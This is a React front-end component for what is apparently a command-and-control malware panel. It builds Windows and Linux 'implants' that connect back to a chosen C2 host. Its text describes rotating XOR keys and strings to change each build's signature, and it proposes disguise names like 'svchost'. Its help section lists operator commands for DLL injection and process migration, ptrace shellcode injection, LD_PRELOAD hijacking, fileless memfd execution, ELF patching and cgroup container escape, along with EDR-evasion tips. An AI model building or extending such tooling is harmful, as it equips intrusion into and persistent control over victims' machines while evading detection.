import React, { useCallback, useEffect, useState } from 'react';
import styled from 'styled-components';
import axios from 'axios';
import { toast } from 'react-toastify';
import { FaWindows, FaLinux } from 'react-icons/fa';
import { FiDownload, FiRefreshCw, FiCpu, FiHelpCircle, FiChevronDown, FiTrash2 } from 'react-icons/fi';

const Section = styled.section`
  animation: fadeIn 0.35s ease-out;
  min-height: calc(100vh - 120px);

  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(8px); }
    to { opacity: 1; transform: translateY(0); }
  }
`;

const Head = styled.div`
  display: flex;
  align-items: flex-end;
  justify-content: space-between;
  gap: 16px;
  flex-wrap: wrap;
  margin-bottom: 16px;

  h2 {
    margin: 0;
    font-family: 'Syne', system-ui, sans-serif;
    font-size: 22px;
    font-weight: 700;
    letter-spacing: -0.03em;
    color: #eef1f6;
  }

  p {
    margin: 6px 0 0;
    color: #8b93a7;
    font-size: 13px;
    max-width: 560px;
  }
`;

const Grid = styled.div`
  display: grid;
  grid-template-columns: 1.1fr 1fr;
  gap: 28px;

  @media (max-width: 980px) {
    grid-template-columns: 1fr;
  }
`;

const Field = styled.label`
  display: flex;
  flex-direction: column;
  gap: 6px;
  margin-bottom: 12px;
  font-size: 12px;
  color: #8b93a7;
  text-transform: uppercase;
  letter-spacing: 0.08em;
  font-weight: 600;
`;

const Input = styled.input`
  background: #161a22;
  border: 1px solid #2a3140;
  color: #eef1f6;
  border-radius: 8px;
  padding: 10px 12px;
  font-size: 14px;
  font-family: inherit;
  text-transform: none;
  letter-spacing: normal;
  font-weight: 500;
  outline: none;

  &:focus {
    border-color: #c6f23e;
  }
`;

const Select = styled.select`
  background: #161a22;
  border: 1px solid #2a3140;
  color: #eef1f6;
  border-radius: 8px;
  padding: 10px 12px;
  font-size: 14px;
  font-family: inherit;
  text-transform: none;
  letter-spacing: normal;
  font-weight: 500;
  outline: none;

  &:focus {
    border-color: #c6f23e;
  }

  option {
    background: #161a22;
  }
`;

const PlatformRow = styled.div`
  display: flex;
  gap: 8px;
  margin-bottom: 14px;
`;

const PlatformBtn = styled.button`
  flex: 1;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  padding: 12px;
  border-radius: 10px;
  border: 1px solid ${props => props.$active ? 'rgba(198, 242, 62, 0.35)' : '#2a3140'};
  background: ${props => props.$active ? 'rgba(198, 242, 62, 0.12)' : '#161a22'};
  color: ${props => props.$active ? '#c6f23e' : '#aeb6c7'};
  font-family: inherit;
  font-weight: 600;
  font-size: 13px;
  cursor: pointer;
  transition: border-color 0.15s, color 0.15s, background 0.15s;

  &:hover {
    border-color: rgba(198, 242, 62, 0.35);
    color: #c6f23e;
  }
`;

const GenerateBtn = styled.button`
  width: 100%;
  margin-top: 4px;
  padding: 12px 16px;
  border: none;
  border-radius: 10px;
  background: #c6f23e;
  color: #0e1014;
  font-family: inherit;
  font-weight: 700;
  font-size: 14px;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  transition: background 0.15s;

  &:hover:not(:disabled) {
    background: #d4ff5a;
  }

  &:disabled {
    opacity: 0.55;
    cursor: not-allowed;
  }
`;

const Note = styled.div`
  margin-top: 12px;
  font-size: 12px;
  color: #8b93a7;
  line-height: 1.5;
`;

const BuildsHead = styled.div`
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 10px;

  h3 {
    margin: 0;
    font-size: 13px;
    text-transform: uppercase;
    letter-spacing: 0.1em;
    color: #5c657a;
    font-weight: 600;
  }
`;

const IconBtn = styled.button`
  background: transparent;
  border: 1px solid #2a3140;
  color: #aeb6c7;
  width: 32px;
  height: 32px;
  border-radius: 8px;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;

  &:hover {
    border-color: #c6f23e;
    color: #c6f23e;
  }
`;

const BuildList = styled.div`
  max-height: 280px;
  overflow-y: auto;
  display: flex;
  flex-direction: column;
  gap: 6px;
`;

const HelpSection = styled.div`
  margin-top: 32px;
  padding-top: 24px;
  border-top: 1px solid #2a3140;
`;

const HelpToggle = styled.button`
  background: transparent;
  border: none;
  color: #8b93a7;
  padding: 0;
  font-size: 16px;
  font-weight: 600;
  display: flex;
  align-items: center;
  gap: 8px;
  cursor: pointer;
  transition: color 0.15s;
  margin-bottom: 16px;

  &:hover {
    color: #c6f23e;
  }

  .chevron {
    transition: transform 0.2s;
    transform: ${props => props.$expanded ? 'rotate(180deg)' : 'rotate(0deg)'};
  }
`;

const HelpContent = styled.div`
  display: ${props => props.$show ? 'block' : 'none'};
  animation: ${props => props.$show ? 'fadeIn 0.3s ease-out' : 'none'};

  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(-8px); }
    to { opacity: 1; transform: translateY(0); }
  }
`;

const HelpTabs = styled.div`
  display: flex;
  gap: 4px;
  margin-bottom: 20px;
  border-bottom: 1px solid #2a3140;
`;

const HelpTab = styled.button`
  background: ${props => props.$active ? 'rgba(198, 242, 62, 0.1)' : 'transparent'};
  border: none;
  color: ${props => props.$active ? '#c6f23e' : '#8b93a7'};
  padding: 10px 16px;
  font-size: 14px;
  font-weight: 500;
  cursor: pointer;
  border-radius: 8px 8px 0 0;
  border-bottom: 2px solid ${props => props.$active ? '#c6f23e' : 'transparent'};
  transition: all 0.15s;

  &:hover {
    color: #c6f23e;
    background: rgba(198, 242, 62, 0.05);
  }

  display: flex;
  align-items: center;
  gap: 6px;
`;

const CommandSection = styled.div`
  margin-bottom: 24px;

  h4 {
    color: #eef1f6;
    font-size: 15px;
    font-weight: 600;
    margin: 0 0 12px;
    display: flex;
    align-items: center;
    gap: 8px;
  }

  p {
    color: #8b93a7;
    font-size: 13px;
    margin: 0 0 12px;
    line-height: 1.5;
  }
`;

const CommandList = styled.div`
  display: flex;
  flex-direction: column;
  gap: 8px;
`;

const Command = styled.div`
  background: #161a22;
  border: 1px solid #2a3140;
  border-radius: 6px;
  padding: 12px;

  .cmd-name {
    color: #c6f23e;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 13px;
    font-weight: 600;
    margin-bottom: 4px;
  }

  .cmd-desc {
    color: #aeb6c7;
    font-size: 12px;
    line-height: 1.4;
  }

  .cmd-example {
    color: #5c657a;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 11px;
    margin-top: 6px;
    padding: 6px 8px;
    background: rgba(0, 0, 0, 0.3);
    border-radius: 4px;
  }
`;

const BuildRow = styled.div`
  display: grid;
  grid-template-columns: 28px 1fr auto;
  gap: 10px;
  align-items: center;
  padding: 10px 8px;
  border-bottom: 1px solid #1e2430;
`;

const BuildMeta = styled.div`
  min-width: 0;

  .name {
    font-size: 13px;
    font-weight: 600;
    color: #eef1f6;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
  }

  .sub {
    font-size: 11px;
    color: #8b93a7;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
  }
`;

const authHeaders = () => ({
  Authorization: `Bearer ${localStorage.getItem('fahis_token') || localStorage.getItem('c2_token') || ''}`,
});

function formatBytes(n) {
  if (!n && n !== 0) return '';
  if (n < 1024) return `${n} B`;
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
  return `${(n / (1024 * 1024)).toFixed(2)} MB`;
}

const ImplantBuilder = () => {
  const [platform, setPlatform] = useState('windows');
  const [arch, setArch] = useState('amd64');
  const [format, setFormat] = useState('exe');
  const [host, setHost] = useState('127.0.0.1');
  const [port, setPort] = useState(2026);
  const [outputName, setOutputName] = useState('');
  const [busy, setBusy] = useState(false);
  const [builds, setBuilds] = useState([]);
  const [helpExpanded, setHelpExpanded] = useState(false);
  const [helpTab, setHelpTab] = useState('windows');

  const loadDefaults = useCallback(async () => {
    try {
      const res = await axios.get('/api/builder/defaults', { headers: authHeaders() });
      if (res.data?.host) setHost(res.data.host);
      if (res.data?.port) setPort(res.data.port);
    } catch (e) {
      /* keep defaults */
    }
  }, []);

  const loadBuilds = useCallback(async () => {
    try {
      const res = await axios.get('/api/builder/builds', { headers: authHeaders() });
      setBuilds(res.data?.builds || []);
    } catch (e) {
      /* ignore */
    }
  }, []);

  useEffect(() => {
    loadDefaults();
    loadBuilds();
  }, [loadDefaults, loadBuilds]);

  const handleGenerate = async () => {
    if (!host.trim()) {
      toast.error('C2 host is required');
      return;
    }
    setBusy(true);
    try {
      const res = await axios.post(
        '/api/builder/generate',
        {
          platform,
          arch,
          format: platform === 'windows' ? format : 'exe',
          host: host.trim(),
          port: Number(port),
          outputName: outputName.trim() || undefined,
        },
        { headers: authHeaders(), timeout: 300000 }
      );
      const b = res.data?.build;
      toast.success(
        `${platform} build ready — signature ${b?.sha256?.slice(0, 10) || ''}…`
      );
      await loadBuilds();
    } catch (e) {
      toast.error(e.response?.data?.error || e.message || 'Build failed');
    } finally {
      setBusy(false);
    }
  };

  const handleDownload = async (id, fileName) => {
    try {
      const res = await axios.get(`/api/builder/download/${id}`, {
        headers: authHeaders(),
        responseType: 'blob',
      });
      const url = window.URL.createObjectURL(new Blob([res.data]));
      const a = document.createElement('a');
      a.href = url;
      a.download = fileName || 'implant';
      document.body.appendChild(a);
      a.click();
      a.remove();
      window.URL.revokeObjectURL(url);
    } catch (e) {
      toast.error('Download failed');
    }
  };

  const handleDelete = async (id, fileName) => {
    if (!window.confirm(`Delete build "${fileName}"?`)) {
      return;
    }
    
    try {
      await axios.delete(`/api/builder/delete/${id}`, { headers: authHeaders() });
      toast.success('Build deleted');
      await loadBuilds();
    } catch (e) {
      toast.error(e.response?.data?.error || 'Delete failed');
    }
  };

  const windowsCommands = [
    {
      name: 'processes',
      desc: 'List processes and copy the host PID you want to live inside',
      example: 'processes'
    },
    {
      name: 'migrate',
      desc: 'REAL inject: drop embedded DLL into that PID via LoadLibrary. Session dies when THAT PID dies.',
      example: 'migrate 3640'
    },
    {
      name: 'injectdll',
      desc: 'REAL inject of a .dll path only (not .exe). Same LoadLibrary behavior as migrate.',
      example: 'injectdll 3640 C:\\Users\\cui12\\AppData\\Local\\Temp\\mshelper_123.dll'
    },
    {
      name: 'checkpersistence',
      desc: 'Show TEMP persistence path of this session',
      example: 'checkpersistence'
    }
  ];

  const linuxCommands = [
    {
      name: 'injectso',
      desc: 'Inject shared library using dlopen via ptrace',
      example: 'injectso 1234 /path/to/payload.so'
    },
    {
      name: 'injectshellcode',
      desc: 'Direct shellcode injection via ptrace',
      example: 'injectshellcode 1234 \\x48\\x31\\xc0\\x50\\x48\\x89\\xe2...'
    },
    {
      name: 'ldpreload',
      desc: 'LD_PRELOAD hijacking for new processes',
      example: 'ldpreload /path/to/malicious.so /bin/target_program'
    },
    {
      name: 'memfd',
      desc: 'Fileless execution using memfd_create',
      example: 'memfd payload_base64_data target_args'
    },
    {
      name: 'ptraceattach',
      desc: 'Attach to process and manipulate memory/registers',
      example: 'ptraceattach 1234 register_dump'
    },
    {
      name: 'elfpatch',
      desc: 'Patch ELF binary entry point or GOT',
      example: 'elfpatch /path/to/binary payload_shellcode_hex'
    },
    {
      name: 'sostomp',
      desc: 'Shared object stomping - replace loaded .so',
      example: 'sostomp 1234 libc.so.6 /path/to/payload.so'
    },
    {
      name: 'cgroupescape',
      desc: 'Container escape via cgroup manipulation',
      example: 'cgroupescape /host_path_to_exploit'
    }
  ];

  return (
    <Section>
      <Head>
        <div>
          <h2>Generate implant</h2>
          <p>
            Build a fresh Windows or Linux binary from <code>lastfinalversion2.go</code>.
            Every generation rotates XOR keys, shift, strings, and padding so the signature changes.
          </p>
        </div>
      </Head>

      <Grid>
        <div>
          <PlatformRow>
            <PlatformBtn
              type="button"
              $active={platform === 'windows'}
              onClick={() => setPlatform('windows')}
            >
              <FaWindows /> Windows
            </PlatformBtn>
            <PlatformBtn
              type="button"
              $active={platform === 'linux'}
              onClick={() => setPlatform('linux')}
            >
              <FaLinux /> Linux
            </PlatformBtn>
          </PlatformRow>

          <Field>
            Architecture
            <Select value={arch} onChange={(e) => setArch(e.target.value)}>
              <option value="amd64">amd64 (x64)</option>
              <option value="386">386 (x86)</option>
              <option value="arm64">arm64</option>
            </Select>
          </Field>

          {platform === 'windows' && (
            <Field>
              Output format
              <Select value={format} onChange={(e) => setFormat(e.target.value)}>
                <option value="exe">EXE + embedded inject DLL (recommended)</option>
                <option value="dll">DLL only (for injectdll path)</option>
              </Select>
            </Field>
          )}

          <Field>
            C2 Host
            <Input
              value={host}
              onChange={(e) => setHost(e.target.value)}
              placeholder="127.0.0.1 or your domain"
            />
          </Field>

          <Field>
            C2 Port
            <Input
              type="number"
              value={port}
              onChange={(e) => setPort(e.target.value)}
              min={1}
              max={65535}
            />
          </Field>

          <Field>
            Output name (optional)
            <Input
              value={outputName}
              onChange={(e) => setOutputName(e.target.value)}
              placeholder={platform === 'windows' ? 'svchost' : 'systemd-helper'}
            />
          </Field>

          <GenerateBtn type="button" onClick={handleGenerate} disabled={busy}>
            <FiCpu />
            {busy
              ? 'Building (unique signature)…'
              : platform === 'windows'
                ? format === 'dll'
                  ? 'Generate Windows DLL'
                  : 'Generate Windows EXE (+ inject DLL)'
                : 'Generate Linux binary'}
          </GenerateBtn>

          <Note>
            Windows EXE builds embed a real inject DLL. After you connect, run{' '}
            <code>migrate &lt;pid&gt;</code> — the session then lives inside that process
            (kill the host PID to kill the session). Do not inject an .exe path.
          </Note>
        </div>

        <div>
          <BuildsHead>
            <h3>Recent builds</h3>
            <IconBtn type="button" onClick={loadBuilds} title="Refresh">
              <FiRefreshCw size={14} />
            </IconBtn>
          </BuildsHead>

          <BuildList>
            {builds.length === 0 ? (
              <div style={{ color: '#5c657a', fontSize: 13, padding: '12px 0' }}>
                No builds yet. Generate one to see it here.
              </div>
            ) : (
              builds.map((b) => (
                <BuildRow key={b.id}>
                  <div style={{ color: '#c6f23e' }}>
                    {b.platform === 'linux' ? <FaLinux /> : <FaWindows />}
                  </div>
                  <BuildMeta>
                    <div className="name">{b.fileName}</div>
                    <div className="sub">
                      {b.platform}/{b.arch}
                      {b.format ? `/${b.format}` : ''}
                      {b.injectDllPacked ? ' · migrate-ready' : ''} · {b.host}:{b.port} ·{' '}
                      {formatBytes(b.size)} · {new Date(b.createdAt).toLocaleString()} ·{' '}
                      {b.sha256?.slice(0, 8)}
                    </div>
                  </BuildMeta>
                  <div style={{ display: 'flex', gap: 4 }}>
                    <IconBtn
                      type="button"
                      title="Download"
                      onClick={() => handleDownload(b.id, b.fileName)}
                    >
                      <FiDownload size={14} />
                    </IconBtn>
                    <IconBtn
                      type="button"
                      title="Delete"
                      onClick={() => handleDelete(b.id, b.fileName)}
                      style={{ color: '#ff6b7a' }}
                    >
                      <FiTrash2 size={14} />
                    </IconBtn>
                  </div>
                </BuildRow>
              ))
            )}
          </BuildList>
        </div>
      </Grid>

      <HelpSection>
        <HelpToggle 
          $expanded={helpExpanded}
          onClick={() => setHelpExpanded(!helpExpanded)}
        >
          <FiHelpCircle />
          Advanced Commands & DLL Injection
          <FiChevronDown className="chevron" />
        </HelpToggle>

        <HelpContent $show={helpExpanded}>
          <HelpTabs>
            <HelpTab 
              $active={helpTab === 'windows'}
              onClick={() => setHelpTab('windows')}
            >
              <FaWindows /> Windows
            </HelpTab>
            <HelpTab 
              $active={helpTab === 'linux'}
              onClick={() => setHelpTab('linux')}
            >
              <FaLinux /> Linux
            </HelpTab>
          </HelpTabs>

          {helpTab === 'windows' && (
            <div>
              <CommandSection>
                <h4>🔥 DLL Injection Techniques</h4>
                <p>
                  Force running processes to load your DLL, executing code with target privileges.
                  Use PID from <code>processes</code> command.
                </p>
                <CommandList>
                  {windowsCommands.map((cmd, i) => (
                    <Command key={i}>
                      <div className="cmd-name">{cmd.name}</div>
                      <div className="cmd-desc">{cmd.desc}</div>
                      <div className="cmd-example">Example: {cmd.example}</div>
                    </Command>
                  ))}
                </CommandList>
              </CommandSection>

              <CommandSection>
                <h4>📋 Real inject (session tied to host PID)</h4>
                <p>
                  1. Generate <b>EXE + embedded inject DLL</b> and run the EXE<br/>
                  2. <code>processes</code> → copy target PID (e.g. notepad)<br/>
                  3. <code>migrate 3640</code><br/>
                  4. New session appears — it lives <b>inside</b> that PID<br/>
                  5. Kill original EXE → session stays · Kill PID 3640 → session dies
                </p>
              </CommandSection>

              <CommandSection>
                <h4>🛠️ Detection Evasion</h4>
                <p>
                  Modern EDRs detect CreateRemoteThread, RWX memory, and abnormal modules.
                  Use APC injection for stealth. Manual mapping bypasses LoadLibrary hooks.
                </p>
              </CommandSection>
            </div>
          )}

          {helpTab === 'linux' && (
            <div>
              <CommandSection>
                <h4>🔥 Process Injection & SO Loading</h4>
                <p>
                  Linux injection via ptrace, LD_PRELOAD, and memory manipulation.
                  Use PID from <code>processes</code> command.
                </p>
                <CommandList>
                  {linuxCommands.map((cmd, i) => (
                    <Command key={i}>
                      <div className="cmd-name">{cmd.name}</div>
                      <div className="cmd-desc">{cmd.desc}</div>
                      <div className="cmd-example">Example: {cmd.example}</div>
                    </Command>
                  ))}
                </CommandList>
              </CommandSection>

              <CommandSection>
                <h4>🛠️ Stealth Considerations</h4>
                <p>
                  Avoid /proc inspection, use memfd for fileless payloads.
                  Container escapes require host filesystem access.
                </p>
              </CommandSection>
            </div>
          )}
        </HelpContent>
      </HelpSection>
    </Section>
  );
};

export default ImplantBuilder;
